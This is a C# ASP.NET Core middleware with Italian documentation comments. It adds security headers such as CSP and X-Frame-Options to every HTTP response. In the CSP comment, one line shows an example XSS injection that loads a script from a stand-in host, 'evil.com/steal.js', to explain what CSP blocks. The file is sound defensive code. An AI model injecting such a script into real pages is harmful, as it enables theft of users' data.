using Microsoft.Extensions.Options;
using Backend.Models.Configuration;

namespace Backend.Security;

/// <summary>
/// Middleware che applica gli header di sicurezza configurati a tutte le risposte HTTP.
/// </summary>
/// <remarks>
/// <para>
/// Questo middleware inietta header di sicurezza in OGNI risposta, incluse quelle di errore
/// (401, 403, 404, 500...). E' posizionato all'inizio della pipeline, prima dell'autenticazione,
/// proprio per questo motivo: anche se la richiesta viene rifiutata da un middleware successivo,
/// la risposta di errore deve comunque avere le protezioni attive.
/// </para>
/// <para>
/// Gli header sono configurati in <c>appsettings.json</c> nella sezione <c>Security.Headers</c>.
/// I piu' importanti e il motivo per cui esistono:
/// </para>
/// <list type="bullet">
/// <item>
/// <description>
/// <b>X-Frame-Options: SAMEORIGIN</b> — permette al sito di caricarsi in iframe
/// solo dalla propria origine, bloccando il framing da siti esterni (clickjacking).
/// </description>
/// </item>
/// <item>
/// <description>
/// <b>Content-Security-Policy (CSP)</b> — definisce una whitelist di origini da cui il
/// browser puo' caricare script, stili, immagini e altre risorse. Se un attaccante riesce
/// a iniettare uno <c>&lt;script src="https://evil.com/steal.js"&gt;</c> nella pagina
/// (via XSS), il browser lo blocca perche' <c>evil.com</c> non e' nella whitelist CSP.
/// E' la difesa piu' efficace contro Cross-Site Scripting (XSS).
/// </description>
/// </item>
/// <item>
/// <description>
/// <b>X-Content-Type-Options: nosniff</b> — impedisce al browser di "indovinare" il tipo
/// MIME di una risorsa. Senza questo, un browser potrebbe interpretare un file di testo
/// come JavaScript ed eseguirlo, aprendo la porta a iniezioni di codice.
/// </description>
/// </item>
/// <item>
/// <description>
/// <b>Referrer-Policy</b> — controlla quante informazioni sull'URL di provenienza vengono
/// inviate nelle richieste verso altri domini. Limita l'esposizione di path e query string
/// potenzialmente sensibili (es. token in URL, ID di sessione).
/// </description>
/// </item>
/// <item>
/// <description>
/// <b>Permissions-Policy</b> — disabilita esplicitamente API del browser che il sito non
/// usa (geolocalizzazione, webcam, microfono, etc.). Se un attaccante inietta codice che
/// tenta di accedere alla webcam, il browser lo blocca a prescindere.
/// </description>
/// </item>
/// </list>
/// <para>
/// Gli header vengono iniettati prima di chiamare <c>_next(context)</c>, quindi sono presenti
/// anche sulle risposte di errore restituite dai middleware successivi (401, 403, 500 ecc.).
/// </para>
/// </remarks>
public class SecurityHeadersMiddleware
{
    private readonly RequestDelegate _next;
    private readonly Dictionary<string, string> _headers;

    /// <summary>
    /// Inizializza il middleware leggendo gli header configurati nelle opzioni di sicurezza.
    /// </summary>
    /// <param name="next">Middleware successivo nella pipeline.</param>
    /// <param name="options">Opzioni che contengono la mappa header-valore da applicare.</param>
    public SecurityHeadersMiddleware(RequestDelegate next, IOptions<SecurityOptions> options)
    {
        _next = next;
        _headers = options.Value.Headers;
    }

    /// <summary>
    /// Registra l'iniezione degli header e passa al middleware successivo.
    /// </summary>
    /// <param name="context">Contesto HTTP corrente.</param>
    public Task InvokeAsync(HttpContext context)
    {
        // OnStarting garantisce che gli header siano presenti anche sulle risposte riscritte
        // dall'exception handler o da UseStatusCodePages, che chiamano Response.Clear()
        // prima di riscrivere la risposta — eliminando qualsiasi header impostato prima di _next().
        context.Response.OnStarting(static state =>
        {
            var (response, headers) = ((HttpResponse, Dictionary<string, string>))state;
            foreach (var (key, value) in headers)
                response.Headers[key] = value;
            return Task.CompletedTask;
        }, (context.Response, _headers));

        return _next(context);
    }
}
